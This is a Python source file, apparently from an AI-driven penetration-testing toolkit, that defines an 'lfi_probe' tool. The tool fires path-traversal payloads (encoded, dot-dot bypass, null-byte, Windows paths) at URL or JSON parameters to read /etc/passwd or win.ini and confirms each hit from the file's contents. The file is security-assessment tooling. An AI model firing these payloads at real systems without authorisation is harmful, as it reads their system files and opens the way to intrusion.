"""Deep path-traversal / LFI probing per parameter, confirmed by file content.

deep_fuzz throws three traversal payloads at a param; this goes deep on the one
class: many traversal encodings (dot-dot bypass, single/double URL-encoding,
absolute, Windows) aimed at known files, and confirms by response CONTENT
signatures (``root:x:0:0`` from /etc/passwd, ``[fonts]`` from win.ini) — a
``critical`` hit means the file was actually read, not that the path reflected.
A per-param baseline plus a payload exclusion suppress reflection false
positives. Payloads are used verbatim (not re-encoded) so each encoding reaches
the server exactly as intended.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


# (label, payload used verbatim, (content signatures proving the file was read))
_TARGETS: tuple[tuple[str, str, tuple[str, ...]], ...] = (
    ("passwd-rel", "../../../../../../../etc/passwd", ("root:x:0:0", "daemon:x:", "/bin/")),
    ("passwd-bypass", "....//....//....//....//....//etc/passwd", ("root:x:0:0", "daemon:x:")),
    ("passwd-enc", "%2e%2e%2f" * 6 + "etc%2fpasswd", ("root:x:0:0",)),
    ("passwd-double-enc", "%252e%252e%252f" * 6 + "etc%252fpasswd", ("root:x:0:0",)),
    ("passwd-abs", "/etc/passwd", ("root:x:0:0",)),
    ("passwd-nullbyte", "../../../../../../etc/passwd%00", ("root:x:0:0",)),
    ("win-ini-rel", "..\\..\\..\\..\\..\\..\\windows\\win.ini", ("[fonts]", "[extensions]")),
    ("win-ini-abs", "C:\\windows\\win.ini", ("[fonts]", "for 16-bit")),
)
_BENIGN = "index.html"
_MAX_PARAMS = 10


def _inject_raw(
    method: str,
    url: str,
    field: str,
    value: str,
    headers: dict[str, str] | None,
    body: str | None,
    point: str,
    timeout: int,
) -> dict[str, Any]:
    """Inject ``value`` verbatim — no re-encoding, so traversal encodings survive."""
    if point == "body" and body is not None:
        try:
            payload = json.loads(body)
        except (json.JSONDecodeError, ValueError):
            payload = {}
        if isinstance(payload, dict):
            payload[field] = value
        return _replay_impl(
            method, url, headers, json.dumps(payload), timeout, allow_redirects=False
        )
    sep = "&" if "?" in url else "?"
    return _replay_impl(
        method, f"{url}{sep}{field}={value}", headers, body, timeout, allow_redirects=False
    )


def _sig_hit(body: str, base_body: str, payload: str, sigs: tuple[str, ...]) -> str | None:
    for sig in sigs:
        if sig in body and sig not in base_body and sig not in payload:
            return sig
    return None


def _probe_param(
    method: str,
    url: str,
    name: str,
    headers: dict[str, str] | None,
    body: str | None,
    point: str,
    timeout: int,
) -> list[dict[str, Any]]:
    base = _inject_raw(method, url, name, _BENIGN, headers, body, point, timeout)
    base_body = base.get("body") or "" if base.get("success") else ""
    findings: list[dict[str, Any]] = []
    for label, payload, sigs in _TARGETS:
        resp = _inject_raw(method, url, name, payload, headers, body, point, timeout)
        if not resp.get("success"):
            continue
        hit = _sig_hit(resp.get("body") or "", base_body, payload, sigs)
        if hit:
            findings.append(
                {
                    "param": name,
                    "family": "lfi",
                    "target": label,
                    "payload": payload,
                    "severity": "critical",
                    "evidence": f"file read via {label}: response contains {hit!r}",
                }
            )
            break  # one confirmed read per param is enough; encodings are equivalent
    return findings


def _lfi_probe_impl(
    method: str,
    url: str,
    params: list[str],
    headers: dict[str, str] | None,
    body: str | None,
    injection_point: str,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if not params:
        return {"success": False, "error": "params cannot be empty (file/path param names)"}
    point = "body" if injection_point == "body" else "query"
    findings: list[dict[str, Any]] = []
    for name in params[:_MAX_PARAMS]:
        findings.extend(_probe_param(method, url, name, headers, body, point, timeout))
    return {
        "success": True,
        "url": url,
        "params_tested": len(params[:_MAX_PARAMS]),
        "finding_count": len(findings),
        "possible_lfi": bool(findings),
        "findings": findings,
    }


@function_tool(timeout=600, strict_mode=False)
async def lfi_probe(
    ctx: RunContextWrapper,
    url: str,
    params: list[str],
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    injection_point: str = "query",
    timeout: int = 12,
) -> str:
    """Deep path-traversal / LFI test each parameter, confirmed by file content.

    Where deep_fuzz sends a few traversal payloads, this drives the class per
    parameter: relative and absolute paths, dot-dot bypass (``....//``), single-
    and double-URL-encoding, null-byte, and Windows paths — each aimed at
    ``/etc/passwd`` or ``win.ini`` and **confirmed by response content
    signatures** (``root:x:0:0``, ``[fonts]``), so a ``critical`` hit means the
    file was actually read, not that the path was reflected. A per-param baseline
    plus a payload exclusion suppress reflection false positives. Payloads are
    sent verbatim so each encoding reaches the server intact. Only test
    authorized targets.

    Common file/path param names to pass: ``file``, ``path``, ``page``,
    ``template``, ``include``, ``doc``, ``download``, ``filename``, ``dir``,
    ``folder``, ``view``, ``lang``, ``locale``, ``load``, ``read``, ``src``.

    Returns JSON with ``possible_lfi``, ``finding_count``, and ``findings``
    (param/target/payload/severity/evidence).

    Args:
        url: Endpoint whose parameter selects a file/path server-side.
        params: File/path parameter names to test (max 10).
        method: HTTP method (default GET).
        headers: Request headers (send session headers if the sink is authed).
        body: Raw body — required when ``injection_point`` is ``body``.
        injection_point: ``query`` (default) or ``body`` (JSON body param).
        timeout: Per-request timeout in seconds (default 12).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _lfi_probe_impl, method, url, params, headers, body, injection_point, timeout
        ),
        ensure_ascii=False,
        default=str,
    )
